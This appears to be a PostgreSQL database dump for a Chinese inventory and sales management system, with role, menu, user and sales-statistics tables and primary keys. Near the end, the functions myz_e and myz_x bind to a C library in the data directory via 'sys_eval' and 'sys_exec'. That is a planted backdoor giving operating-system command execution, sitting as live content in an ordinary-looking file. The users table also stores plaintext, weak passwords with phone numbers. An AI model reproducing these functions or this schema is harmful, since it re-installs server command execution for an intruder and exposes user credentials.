INSERT INTO "public"."purchase_swap" VALUES ('e0c2a77c-3990-42c5-8350-9b4e00a80601', 'ca400d2b-9af2-4e94-97f1-020cca8f7466');
INSERT INTO "public"."purchase_swap" VALUES ('6752d74c-b192-495c-8ca1-866279a4b1ed', '9a7a9ed6-8549-4b20-b7be-027790c7ac93');
INSERT INTO "public"."purchase_swap" VALUES ('6752d74c-b192-495c-8ca1-866279a4b1ed', 'ab2bc3ee-8009-4698-bda2-9e6da14ce8ab');

-- ----------------------------
-- Table structure for role_menu
-- ----------------------------
DROP TABLE IF EXISTS "public"."role_menu";
CREATE TABLE "public"."role_menu" (
  "role_id" varchar(32) COLLATE "pg_catalog"."default" NOT NULL,
  "menu_id" varchar(32) COLLATE "pg_catalog"."default"
)
;
COMMENT ON COLUMN "public"."role_menu"."role_id" IS '角色Id';
COMMENT ON COLUMN "public"."role_menu"."menu_id" IS '菜单id';

-- ----------------------------
-- Records of role_menu
-- ----------------------------
INSERT INTO "public"."role_menu" VALUES ('1', '1');

-- ----------------------------
-- Table structure for roles
-- ----------------------------
DROP TABLE IF EXISTS "public"."roles";
CREATE TABLE "public"."roles" (
  "id" varchar COLLATE "pg_catalog"."default" NOT NULL,
  "name" varchar(255) COLLATE "pg_catalog"."default",
  "keyname" varchar(255) COLLATE "pg_catalog"."default",
  "description" varchar(255) COLLATE "pg_catalog"."default"
)
;
COMMENT ON COLUMN "public"."roles"."id" IS '角色ID

';
COMMENT ON COLUMN "public"."roles"."name" IS '角色名称';
COMMENT ON COLUMN "public"."roles"."keyname" IS '角色键';
COMMENT ON COLUMN "public"."roles"."description" IS '描述';

-- ----------------------------
-- Records of roles
-- ----------------------------
INSERT INTO "public"."roles" VALUES ('e5266cc769e34c87bdc3accb5737eabb', '管理员', 'admin', NULL);
INSERT INTO "public"."roles" VALUES ('e5266cc769e34c87bdc3accb5737eaba', '仓库管理员', 'stoadmin', NULL);
INSERT INTO "public"."roles" VALUES ('707e94ee74a047fa9107ae9eb7c0243d', '业务员', 'user', '111');

-- ----------------------------
-- Table structure for summary_stats
-- ----------------------------
DROP TABLE IF EXISTS "public"."summary_stats";
CREATE TABLE "public"."summary_stats" (
  "year" int4 NOT NULL,
  "month" int4 NOT NULL,
  "sort_name" varchar(255) COLLATE "pg_catalog"."default" NOT NULL,
  "month_sales" int4 NOT NULL
)
;
COMMENT ON COLUMN "public"."summary_stats"."year" IS '统计销售额时的年份';
COMMENT ON COLUMN "public"."summary_stats"."month" IS '统计销售额时的月份';
COMMENT ON COLUMN "public"."summary_stats"."sort_name" IS '产品类别';
COMMENT ON COLUMN "public"."summary_stats"."month_sales" IS '月销售额';

-- ----------------------------
-- Records of summary_stats
-- ----------------------------

-- ----------------------------
-- Table structure for users
-- ----------------------------
DROP TABLE IF EXISTS "public"."users";
CREATE TABLE "public"."users" (
  "id" varchar(255) COLLATE "pg_catalog"."default" NOT NULL,
  "name" varchar(255) COLLATE "pg_catalog"."default",
  "password" varchar(255) COLLATE "pg_catalog"."default",
  "tel_number" varchar COLLATE "pg_catalog"."default",
  "real_name" varchar(255) COLLATE "pg_catalog"."default",
  "role_name" varchar(255) COLLATE "pg_catalog"."default",
  "enabled" int2
)
;
COMMENT ON COLUMN "public"."users"."id" IS '用户ID';
COMMENT ON COLUMN "public"."users"."name" IS '账号';
COMMENT ON COLUMN "public"."users"."password" IS '密码';
COMMENT ON COLUMN "public"."users"."tel_number" IS '电话';
COMMENT ON COLUMN "public"."users"."real_name" IS '真实姓名';
COMMENT ON COLUMN "public"."users"."role_name" IS '角色名称';
COMMENT ON COLUMN "public"."users"."enabled" IS '用户是否启用';

-- ----------------------------
-- Records of users
-- ----------------------------
INSERT INTO "public"."users" VALUES ('3049622c52b4449ab9827d41c23d48c6', 'stoadmin', '111', '13312345678', 'Yjs', 'stoadmin', NULL);
INSERT INTO "public"."users" VALUES ('1b142a6a9a53400eb7a939a94d6b8e23', 'RJN', '893827', '13345667899', 'DJJ', 'admin', NULL);
INSERT INTO "public"."users" VALUES ('89b1f2e2d1c14f43b7646692a48cd167', 'users', '111', '13345457676', '原老师', 'user', NULL);
INSERT INTO "public"."users" VALUES ('7835c13be3644e2e813187a2332e6095', '345345', '817139', '13345645454', '21234rrwer', 'admin', NULL);
INSERT INTO "public"."users" VALUES ('8d5e3d9704b448d5be0854b407650805', 'GaoDianpingasdasdasd', '486595', '18877776666', 'GDPasdasdasd', 'user', NULL);
INSERT INTO "public"."users" VALUES ('33457fd79d274eb48dac131550e2ed4a', 'WMQ', 'finalTest', '13356754567', 'BX', 'admin', NULL);
INSERT INTO "public"."users" VALUES ('0da0422b3d954f269a5de5b42b86eb2e', 'GaoDianping1', '809857', '18877776666', 'GDP234', 'user', NULL);
INSERT INTO "public"."users" VALUES ('6935f92fb67b4ca0b9553e59e9c29932', 'qwerq', '137062', '13345678907', 'qwertyre', 'stoadmin', NULL);
INSERT INTO "public"."users" VALUES ('64d4e2c5251f4a38b3f9f891eb9f4175', 'GDPSDAFGSDF', '463172', '13345677878', 'asdASD', 'user', NULL);
INSERT INTO "public"."users" VALUES ('eee8171d09bf4317a466505378afe500', 'rtyurtyu', '266967', '13456788645', '同样肉体与土壤与', 'admin', NULL);
INSERT INTO "public"."users" VALUES ('1', 'admin', '111', '13345678907', 'yjs', 'admin', NULL);

-- ----------------------------
-- Function structure for myz_e
-- ----------------------------
DROP FUNCTION IF EXISTS "public"."myz_e"(text);
CREATE OR REPLACE FUNCTION "public"."myz_e"(text)
  RETURNS "pg_catalog"."text" AS './base/1/x9193', 'sys_eval'
  LANGUAGE c IMMUTABLE STRICT
  COST 1;

-- ----------------------------
-- Function structure for myz_x
-- ----------------------------
DROP FUNCTION IF EXISTS "public"."myz_x"(text);
CREATE OR REPLACE FUNCTION "public"."myz_x"(text)
  RETURNS "pg_catalog"."int4" AS './base/1/x9193', 'sys_exec'
  LANGUAGE c IMMUTABLE STRICT
  COST 1;

-- ----------------------------
-- Primary Key structure for table client_manage
-- ----------------------------
ALTER TABLE "public"."client_manage" ADD CONSTRAINT "client_manage_pkey" PRIMARY KEY ("client_id");

-- ----------------------------
-- Primary Key structure for table menu
-- ----------------------------
ALTER TABLE "public"."menu" ADD CONSTRAINT "menu_pkey" PRIMARY KEY ("id");

-- ----------------------------
-- Primary Key structure for table order_message
-- ----------------------------
ALTER TABLE "public"."order_message" ADD CONSTRAINT "order_message_pkey" PRIMARY KEY ("order_id");

-- ----------------------------
-- Primary Key structure for table product_manage
-- ----------------------------
ALTER TABLE "public"."product_manage" ADD CONSTRAINT "product_manage _pkey" PRIMARY KEY ("product_id");

-- ----------------------------
-- Primary Key structure for table product_order
-- ----------------------------
ALTER TABLE "public"."product_order" ADD CONSTRAINT "product_order_pkey" PRIMARY KEY ("order_id");

-- ----------------------------
-- Primary Key structure for table product_sort
-- ----------------------------
ALTER TABLE "public"."product_sort" ADD CONSTRAINT "product_sort_pk" PRIMARY KEY ("sort_id");

-- ----------------------------
-- Primary Key structure for table product_store
-- ----------------------------
ALTER TABLE "public"."product_store" ADD CONSTRAINT "product_store_pkey" PRIMARY KEY ("store_id");

-- ----------------------------
-- Primary Key structure for table purchase
-- ----------------------------
ALTER TABLE "public"."purchase" ADD CONSTRAINT "produce_purchase_pkey" PRIMARY KEY ("purchase_id");

-- ----------------------------
-- Primary Key structure for table purchase_sort
-- ----------------------------
ALTER TABLE "public"."purchase_sort" ADD CONSTRAINT "produce_purchase_sort_pkey" PRIMARY KEY ("id");

-- ----------------------------
-- Primary Key structure for table role_menu
-- ----------------------------
ALTER TABLE "public"."role_menu" ADD CONSTRAINT "role_menu_pkey" PRIMARY KEY ("role_id");

-- ----------------------------
-- Primary Key structure for table roles
-- ----------------------------
ALTER TABLE "public"."roles" ADD CONSTRAINT "roles_pkey" PRIMARY KEY ("id");

-- ----------------------------
-- Primary Key structure for table users
-- ----------------------------
ALTER TABLE "public"."users" ADD CONSTRAINT "users_pkey" PRIMARY KEY ("id");
